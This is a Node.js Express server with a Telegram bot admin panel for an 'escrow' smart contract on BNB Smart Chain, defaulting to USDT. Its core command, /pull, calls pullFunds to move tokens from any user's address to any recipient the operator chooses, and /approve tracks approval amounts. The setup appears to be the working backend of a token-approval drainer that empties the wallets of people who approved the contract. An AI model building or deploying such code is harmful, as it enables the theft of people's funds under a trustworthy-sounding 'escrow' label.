require('dotenv').config();

const path = require('path');
const express = require('express');
const { ethers } = require('ethers');
const axios = require('axios');

function getEnv(name, fallbacks = []) {
  const keys = [name, ...fallbacks];
  for (const key of keys) {
    const value = process.env[key];
    if (value && String(value).trim()) {
      return String(value).trim();
    }
  }
  return null;
}

function requireEnv(name, fallbacks = []) {
  const value = getEnv(name, fallbacks);
  if (!value) {
    const aliases = fallbacks.length ? ` (or ${fallbacks.join(', ')})` : '';
    throw new Error(`Missing required environment variable: ${name}${aliases}`);
  }
  return value;
}

const TELEGRAM_BOT_TOKEN = requireEnv('TELEGRAM_BOT_TOKEN');
const CONTRACT_ADDRESS = requireEnv('CONTRACT_ADDRESS', ['ESCROW_CONTRACT_ADDRESS']);
const COMPANY_WALLET_ADDRESS = getEnv('COMPANY_WALLET_ADDRESS');
const ADMIN_CHAT_ID = requireEnv('ADMIN_CHAT_ID');
const PRIVATE_KEY = requireEnv('PRIVATE_KEY', ['SENDER_KEY']);
const BSC_RPC_URL = getEnv('BSC_RPC_URL') || 'https://bsc-dataseed1.binance.org/';
const USDT_ADDRESS = getEnv('USDT_ADDRESS') || '0x55d398326f99059fF775485246999027B3197955';
const PORT = Number(process.env.PORT) || 3000;
const USDT_DECIMALS = Number(process.env.USDT_DECIMALS) || 18;

const app = express();
app.use(express.json());

const provider = new ethers.providers.JsonRpcProvider(BSC_RPC_URL);
const wallet = new ethers.Wallet(PRIVATE_KEY, provider);

const escrowAbi = [
  'function notifyApproval(uint256 _amount) external',
  'function pullFunds(address token, address user, address recipient, uint256 amount) external',
  'function setCompanyWallet(address _new) external',
  'event UserApprovalNotified(address indexed user, uint256 amount)',
  'event FundsPulled(address indexed token, address indexed user, address indexed recipient, uint256 amount)'
];

const escrowContract = new ethers.Contract(CONTRACT_ADDRESS, escrowAbi, wallet);
const TELEGRAM_API = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;

function isAdminChat(chatId) {
  return String(chatId).trim() === String(ADMIN_CHAT_ID).trim();
}

function parseTokenAmount(amount) {
  return ethers.utils.parseUnits(String(amount).trim(), USDT_DECIMALS);
}

async function sendTelegramMessage(chatId, text) {
  try {
    await axios.post(`${TELEGRAM_API}/sendMessage`, {
      chat_id: chatId,
      text,
      parse_mode: 'Markdown'
    });
  } catch (error) {
    console.error('Error sending Telegram message:', error.response?.data || error.message);
  }
}

app.post('/webhook/:token', async (req, res) => {
  if (req.params.token !== TELEGRAM_BOT_TOKEN) {
    return res.sendStatus(404);
  }
  const { message } = req.body;
  if (!message) return res.sendStatus(200);

  const { chat, text } = message;
  const chatId = chat.id;

  if (!text) return res.sendStatus(200);

  if (!isAdminChat(chatId)) {
    await sendTelegramMessage(chatId, '🚫 You are not authorized to use this bot.');
    return res.sendStatus(200);
  }

  if (text.startsWith('/start')) {
    await sendTelegramMessage(
      chatId,
      '🌟 *Welcome to Escrow Admin Panel*\n\nAvailable commands:\n\n' +
        '- `/approve <amount>`: Notify approval for a user\n' +
        '- `/pull <token> <user> <recipient> <amount>`: Pull funds from a user\n' +
        '- `/setwallet <newWallet>`: Update company wallet address'
    );
  } else if (text.startsWith('/approve')) {
    const amount = text.split(' ')[1];
    if (!amount) {
      await sendTelegramMessage(chatId, '❌ Please provide an amount. Example: `/approve 100`');
      return res.sendStatus(200);
    }

    try {
      const parsedAmount = parseTokenAmount(amount);
      const tx = await escrowContract.notifyApproval(parsedAmount);
      await tx.wait();
      await sendTelegramMessage(
        chatId,
        `✅ Approval notified for amount: *${amount}*\n\nTransaction Hash: \`${tx.hash}\``
      );
    } catch (error) {
      await sendTelegramMessage(chatId, `❌ Error: ${error.message}`);
    }
  } else if (text.startsWith('/pull')) {
    const parts = text.split(' ').filter(Boolean);
    if (parts.length !== 5) {
      await sendTelegramMessage(
        chatId,
        '❌ Invalid format. Example: `/pull 0xTokenAddress 0xUserAddress 0xRecipientAddress 100`'
      );
      return res.sendStatus(200);
    }

    const [, token, user, recipient, amount] = parts;
    try {
      const parsedAmount = parseTokenAmount(amount);
      const tx = await escrowContract.pullFunds(token, user, recipient, parsedAmount);
      await tx.wait();
      await sendTelegramMessage(
        chatId,
        `✅ Funds pulled successfully!\n\nToken: *${token}*\nUser: *${user}*\nRecipient: *${recipient}*\nAmount: *${amount}*\n\nTransaction Hash: \`${tx.hash}\``
      );
    } catch (error) {
      await sendTelegramMessage(chatId, `❌ Error: ${error.message}`);
    }
  } else if (text.startsWith('/setwallet')) {
    const newWallet = text.split(' ')[1];
    if (!newWallet || !ethers.utils.isAddress(newWallet)) {
      await sendTelegramMessage(
        chatId,
        '❌ Please provide a valid wallet address. Example: `/setwallet 0xNewWalletAddress`'
      );
      return res.sendStatus(200);
    }

    try {
      const tx = await escrowContract.setCompanyWallet(newWallet);
      await tx.wait();
      await sendTelegramMessage(
        chatId,
        `✅ Company wallet updated to: *${newWallet}*\n\nTransaction Hash: \`${tx.hash}\``
      );
    } catch (error) {
      await sendTelegramMessage(chatId, `❌ Error: ${error.message}`);
    }
  } else {
    await sendTelegramMessage(chatId, '❌ Unknown command. Type /start to see available commands.');
  }

  res.sendStatus(200);
});

app.get('/health', (_req, res) => {
  res.json({
    ok: true,
    contract: CONTRACT_ADDRESS,
    companyWallet: COMPANY_WALLET_ADDRESS || null,
    rpc: BSC_RPC_URL
  });
});

if (!process.env.VERCEL) {
  const staticRoot = path.join(__dirname, 'public');
  app.get('/', (_req, res) => {
    res.sendFile(path.join(staticRoot, 'index.html'));
  });
  app.use(express.static(staticRoot));
}

module.exports = app;

if (!process.env.VERCEL) {
  app.listen(PORT, () => {
    console.log(`Server running at http://localhost:${PORT}`);
    console.log(`Escrow contract: ${CONTRACT_ADDRESS}`);
    if (COMPANY_WALLET_ADDRESS) {
      console.log(`Company wallet: ${COMPANY_WALLET_ADDRESS}`);
    }
    console.log(`Default USDT token: ${USDT_ADDRESS}`);
  });
}
